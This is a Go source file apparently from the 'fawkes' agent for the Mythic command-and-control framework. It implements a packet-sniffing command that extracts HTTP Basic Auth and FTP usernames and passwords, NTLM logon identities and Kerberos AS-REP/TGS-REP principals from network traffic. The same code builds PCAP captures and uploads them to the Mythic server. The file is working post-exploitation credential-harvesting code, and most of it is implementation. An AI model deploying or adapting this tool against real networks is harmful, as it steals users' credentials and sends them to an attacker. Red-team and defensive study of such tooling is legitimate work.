package commands

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"fawkes/pkg/structs"
)

type sniffParams struct {
	Interface   string `json:"interface"`
	Duration    int    `json:"duration"`
	MaxBytes    int64  `json:"max_bytes"`
	Ports       string `json:"ports"`
	Promiscuous bool   `json:"promiscuous"`
	SavePCAP    bool   `json:"save_pcap"`
}

type sniffCredential struct {
	Protocol  string `json:"protocol"`
	SrcIP     string `json:"src_ip"`
	SrcPort   uint16 `json:"src_port"`
	DstIP     string `json:"dst_ip"`
	DstPort   uint16 `json:"dst_port"`
	Username  string `json:"username"`
	Password  string `json:"password,omitempty"`
	Detail    string `json:"detail,omitempty"`
	Timestamp int64  `json:"timestamp"`
}

type sniffResult struct {
	Duration      string             `json:"duration"`
	PacketCount   int                `json:"packet_count"`
	BytesCaptured int64              `json:"bytes_captured"`
	Credentials   []*sniffCredential `json:"credentials"`
	Errors        []string           `json:"errors,omitempty"`
	PCAPFileID    string             `json:"pcap_file_id,omitempty"`
}

// sniffPCAPCollector collects raw packets for PCAP file generation.
type sniffPCAPCollector struct {
	mu      sync.Mutex
	packets []sniffPCAPPacket
	maxSize int64
	size    int64
}

type sniffPCAPPacket struct {
	timestamp time.Time
	data      []byte
}

func newSniffPCAPCollector(maxSize int64) *sniffPCAPCollector {
	return &sniffPCAPCollector{maxSize: maxSize}
}

func (c *sniffPCAPCollector) addPacket(data []byte) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.size+int64(len(data)) > c.maxSize {
		return // Drop packet if over size limit
	}
	pkt := sniffPCAPPacket{
		timestamp: time.Now(),
		data:      make([]byte, len(data)),
	}
	copy(pkt.data, data)
	c.packets = append(c.packets, pkt)
	c.size += int64(len(data))
}

// buildPCAP generates a libpcap-format file from collected packets.
// Uses the standard pcap file format (magic 0xA1B2C3D4).
func (c *sniffPCAPCollector) buildPCAP(linkType uint32) []byte {
	c.mu.Lock()
	defer c.mu.Unlock()

	// Estimate total size: 24 (global header) + N * (16 + packet_len)
	totalSize := 24
	for _, p := range c.packets {
		totalSize += 16 + len(p.data)
	}

	buf := make([]byte, 0, totalSize)

	// PCAP Global Header (24 bytes)
	hdr := make([]byte, 24)
	binary.LittleEndian.PutUint32(hdr[0:4], 0xA1B2C3D4)   // magic
	binary.LittleEndian.PutUint16(hdr[4:6], 2)              // version major
	binary.LittleEndian.PutUint16(hdr[6:8], 4)              // version minor
	binary.LittleEndian.PutUint32(hdr[8:12], 0)             // thiszone
	binary.LittleEndian.PutUint32(hdr[12:16], 0)            // sigfigs
	binary.LittleEndian.PutUint32(hdr[16:20], 65535)        // snaplen
	binary.LittleEndian.PutUint32(hdr[20:24], linkType)     // link type
	buf = append(buf, hdr...)

	// Per-packet records
	for _, p := range c.packets {
		rec := make([]byte, 16)
		binary.LittleEndian.PutUint32(rec[0:4], uint32(p.timestamp.Unix()))
		binary.LittleEndian.PutUint32(rec[4:8], uint32(p.timestamp.Nanosecond()/1000)) // microseconds
		binary.LittleEndian.PutUint32(rec[8:12], uint32(len(p.data)))                  // incl_len
		binary.LittleEndian.PutUint32(rec[12:16], uint32(len(p.data)))                 // orig_len
		buf = append(buf, rec...)
		buf = append(buf, p.data...)
	}

	return buf
}

type packetMeta struct {
	SrcIP   string
	DstIP   string
	SrcPort uint16
	DstPort uint16
}

// sniffUploadPCAP uploads a PCAP file to Mythic using the file transfer channel.
func sniffUploadPCAP(task *structs.Task, pcapData []byte, result *sniffResult) {
	uploadMsg := structs.SendFileToMythicStruct{}
	uploadMsg.Task = task
	uploadMsg.IsScreenshot = false
	uploadMsg.SendUserStatusUpdates = false
	uploadMsg.Data = &pcapData
	uploadMsg.FileName = fmt.Sprintf("sniff_%s.pcap", time.Now().Format("20060102_150405"))
	uploadMsg.FullPath = ""
	uploadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- uploadMsg

	// Wait for transfer (with timeout)
	select {
	case <-uploadMsg.FinishedTransfer:
		result.PCAPFileID = uploadMsg.FileName
	case <-time.After(60 * time.Second):
		result.Errors = append(result.Errors, "PCAP upload timed out")
	}
}

// HTTP Basic Auth extraction
func sniffExtractHTTPBasicAuth(payload []byte, meta *packetMeta) *sniffCredential {
	s := string(payload)
	if len(s) < 4 {
		return nil
	}
	if s[0] != 'G' && s[0] != 'P' && s[0] != 'H' && s[0] != 'D' && s[0] != 'O' {
		return nil
	}

	idx := strings.Index(strings.ToLower(s), "authorization: basic ")
	if idx < 0 {
		return nil
	}

	start := idx + len("authorization: basic ")
	rest := s[start:]
	end := strings.Index(rest, "\r\n")
	if end < 0 {
		end = len(rest)
	}
	encoded := strings.TrimSpace(rest[:end])

	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		decoded, err = base64.RawStdEncoding.DecodeString(encoded)
		if err != nil {
			return nil
		}
	}

	parts := strings.SplitN(string(decoded), ":", 2)
	if len(parts) != 2 {
		return nil
	}

	return &sniffCredential{
		Protocol:  "http-basic",
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  parts[0],
		Password:  parts[1],
		Timestamp: time.Now().Unix(),
	}
}

// FTP credential tracking
type sniffFTPTracker struct {
	mu      sync.Mutex
	pending map[string]string
}

func (ft *sniffFTPTracker) process(payload []byte, meta *packetMeta) *sniffCredential {
	s := strings.TrimSpace(string(payload))
	if len(s) == 0 || len(s) > 512 {
		return nil
	}

	key := fmt.Sprintf("%s:%d->%s:%d", meta.SrcIP, meta.SrcPort, meta.DstIP, meta.DstPort)
	upper := strings.ToUpper(s)

	ft.mu.Lock()
	defer ft.mu.Unlock()

	if strings.HasPrefix(upper, "USER ") {
		username := strings.TrimSpace(s[5:])
		if username != "" && username != "anonymous" {
			ft.pending[key] = username
		}
		return nil
	}

	if strings.HasPrefix(upper, "PASS ") {
		password := strings.TrimSpace(s[5:])
		if username, ok := ft.pending[key]; ok {
			delete(ft.pending, key)
			return &sniffCredential{
				Protocol:  "ftp",
				SrcIP:     meta.SrcIP,
				SrcPort:   meta.SrcPort,
				DstIP:     meta.DstIP,
				DstPort:   meta.DstPort,
				Username:  username,
				Password:  password,
				Timestamp: time.Now().Unix(),
			}
		}
	}

	return nil
}

// NTLM detection
var sniffNTLMSig = []byte("NTLMSSP\x00")

func sniffExtractNTLM(payload []byte, meta *packetMeta) *sniffCredential {
	idx := bytes.Index(payload, sniffNTLMSig)
	if idx < 0 {
		return nil
	}

	data := payload[idx:]
	if len(data) < 72 {
		return nil
	}

	msgType := binary.LittleEndian.Uint32(data[8:12])
	if msgType != 3 {
		return nil
	}

	readField := func(lenOff, offOff int) string {
		if len(data) < offOff+4 {
			return ""
		}
		fLen := binary.LittleEndian.Uint16(data[lenOff : lenOff+2])
		fOff := binary.LittleEndian.Uint32(data[offOff : offOff+4])
		end := uint32(fLen) + fOff
		if fLen == 0 || end > uint32(len(data)) {
			return ""
		}
		return sniffDecodeUTF16LE(data[fOff:end])
	}

	domain := readField(28, 32)
	user := readField(36, 40)
	host := readField(44, 48)

	if user == "" {
		return nil
	}

	username := user
	if domain != "" {
		username = domain + "\\" + user
	}

	return &sniffCredential{
		Protocol:  "ntlm",
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  username,
		Detail:    fmt.Sprintf("host=%s", host),
		Timestamp: time.Now().Unix(),
	}
}

func sniffDecodeUTF16LE(b []byte) string {
	if len(b) < 2 || len(b)%2 != 0 {
		return ""
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return string(utf16.Decode(u16))
}

// Kerberos AS-REP extraction (T1558.004 — AS-REP Roasting)
// AS-REP has application tag 11 (0x6B). We look for the encrypted part
// which contains the ticket that can be cracked offline if pre-auth is disabled.
func sniffExtractKerberos(payload []byte, meta *packetMeta) *sniffCredential {
	// Kerberos typically runs on port 88
	if meta.DstPort != 88 && meta.SrcPort != 88 {
		return nil
	}

	// Look for AS-REP (application tag 11 = 0x6B) or TGS-REP (application tag 13 = 0x6D)
	// AS-REP: response to AS-REQ, contains ticket for the requesting principal
	// We parse the outer ASN.1 structure to extract the client principal name and realm
	data := payload

	// Skip any TCP framing (Kerberos over TCP prepends 4-byte length)
	if len(data) >= 4 {
		frameLen := int(binary.BigEndian.Uint32(data[0:4]))
		if frameLen > 0 && frameLen <= len(data)-4 {
			candidate := data[4:]
			if len(candidate) > 2 && (candidate[0] == 0x6B || candidate[0] == 0x6D) {
				data = candidate
			}
		}
	}

	if len(data) < 10 {
		return nil
	}

	isASREP := data[0] == 0x6B
	isTGSREP := data[0] == 0x6D
	if !isASREP && !isTGSREP {
		return nil
	}

	protocol := "krb-asrep"
	if isTGSREP {
		protocol = "krb-tgsrep"
	}

	// Parse outer SEQUENCE length to validate this is a real Kerberos message
	innerData, ok := sniffASN1Skip(data, data[0])
	if !ok || len(innerData) < 6 {
		return nil
	}

	// AS-REP/TGS-REP body is a SEQUENCE (0x30)
	if innerData[0] != 0x30 {
		return nil
	}
	seqData, ok := sniffASN1Skip(innerData, 0x30)
	if !ok || len(seqData) < 4 {
		return nil
	}

	// Parse tagged fields inside the SEQUENCE
	// [0] pvno, [1] msg-type, [2] padata (optional), [3] crealm, [4] cname, [5] ticket, [6] enc-part
	var realm, principalName string
	pos := seqData
	for len(pos) > 2 {
		tag := pos[0]
		fieldData, ok := sniffASN1Skip(pos, tag)
		if !ok {
			break
		}

		tagNum := tag & 0x1F
		switch tagNum {
		case 3: // crealm — GeneralString
			if len(fieldData) > 2 && fieldData[0] == 0x1B { // GeneralString
				str, sOk := sniffASN1ReadString(fieldData)
				if sOk {
					realm = str
				}
			}
		case 4: // cname — PrincipalName SEQUENCE
			principalName = sniffExtractPrincipalName(fieldData)
		}

		// Advance past this field
		_, totalLen := sniffASN1Len(pos[1:])
		advance := 1 + totalLen + int(sniffASN1ContentLen(pos))
		if advance <= 0 || advance > len(pos) {
			break
		}
		pos = pos[advance:]
	}

	if principalName == "" {
		return nil
	}

	username := principalName
	if realm != "" {
		username = principalName + "@" + realm
	}

	return &sniffCredential{
		Protocol:  protocol,
		SrcIP:     meta.SrcIP,
		SrcPort:   meta.SrcPort,
		DstIP:     meta.DstIP,
		DstPort:   meta.DstPort,
		Username:  username,
		Detail:    fmt.Sprintf("realm=%s", realm),
		Timestamp: time.Now().Unix(),
	}
}

// sniffExtractPrincipalName extracts the name-string from a PrincipalName ASN.1 structure.
func sniffExtractPrincipalName(data []byte) string {
	// PrincipalName ::= SEQUENCE { name-type [0] Int32, name-string [1] SEQUENCE OF GeneralString }
	if len(data) < 2 || data[0] != 0x30 {
		return ""
	}
	seqData, ok := sniffASN1Skip(data, 0x30)
	if !ok {
		return ""
	}

	var parts []string
	pos := seqData
	for len(pos) > 2 {
		tag := pos[0]
		fieldData, ok := sniffASN1Skip(pos, tag)
		if !ok {
			break
		}

		if tag&0x1F == 1 { // [1] name-string
			// SEQUENCE OF GeneralString
			if len(fieldData) > 2 && fieldData[0] == 0x30 {
				inner, innerOk := sniffASN1Skip(fieldData, 0x30)
				if innerOk {
					namePos := inner
					for len(namePos) > 2 {
						if namePos[0] == 0x1B { // GeneralString
							str, sOk := sniffASN1ReadString(namePos)
							if sOk {
								parts = append(parts, str)
							}
						}
						_, tl := sniffASN1Len(namePos[1:])
						adv := 1 + tl + int(sniffASN1ContentLen(namePos))
						if adv <= 0 || adv > len(namePos) {
							break
						}
						namePos = namePos[adv:]
					}
				}
			}
		}

		_, tl := sniffASN1Len(pos[1:])
		advance := 1 + tl + int(sniffASN1ContentLen(pos))
		if advance <= 0 || advance > len(pos) {
			break
		}
		pos = pos[advance:]
	}

	if len(parts) == 0 {
		return ""
	}
	return strings.Join(parts, "/")
}

// ASN.1 DER minimal helpers for Kerberos parsing

// sniffASN1Skip reads past tag+length and returns the content bytes.
func sniffASN1Skip(data []byte, expectedTag byte) ([]byte, bool) {
	if len(data) < 2 || data[0] != expectedTag {
		return nil, false
	}
	contentLen, lenBytes := sniffASN1Len(data[1:])
	if lenBytes == 0 || contentLen < 0 {
		return nil, false
	}
	start := 1 + lenBytes
	end := start + contentLen
	if end > len(data) {
		return nil, false
	}
	return data[start:end], true
}

// sniffASN1Len reads a DER length field. Returns (content length, bytes consumed for length encoding).
func sniffASN1Len(data []byte) (int, int) {
	if len(data) == 0 {
		return -1, 0
	}
	if data[0] < 0x80 {
		return int(data[0]), 1
	}
	numBytes := int(data[0] & 0x7F)
	if numBytes == 0 || numBytes > 4 || numBytes >= len(data) {
		return -1, 0
	}
	length := 0
	for i := 1; i <= numBytes; i++ {
		length = (length << 8) | int(data[i])
	}
	return length, 1 + numBytes
}

// sniffASN1ContentLen returns the content length from a TLV at position data.
func sniffASN1ContentLen(data []byte) int {
	if len(data) < 2 {
		return 0
	}
	cl, _ := sniffASN1Len(data[1:])
	if cl < 0 {
		return 0
	}
	return cl
}

// sniffASN1ReadString reads a GeneralString/UTF8String/OctetString value.
func sniffASN1ReadString(data []byte) (string, bool) {
	if len(data) < 2 {
		return "", false
	}
	content, ok := sniffASN1Skip(data, data[0])
	if !ok {
		return "", false
	}
	return string(content), true
}
